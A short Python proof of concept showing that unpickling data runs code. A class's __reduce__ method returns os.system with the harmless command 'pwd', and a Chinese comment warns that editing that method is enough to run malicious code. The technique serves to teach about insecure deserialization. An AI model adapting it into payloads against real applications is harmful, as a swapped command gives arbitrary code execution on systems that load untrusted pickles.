# -*- coding: utf-8  -*-
# -*- author: jokker -*-


import pickle
import os

# fixme 确实相当危险，只需要修改 __reduce__ 方法，就能执行恶意代码

class Poc:
	def __reduce__(self):
		cmd = "pwd"
		return os.system, (cmd,)

poc = Poc()
pickle.dump(poc, open('poc.txt', 'wb'))

pickle.load(open('poc.txt', 'br'))

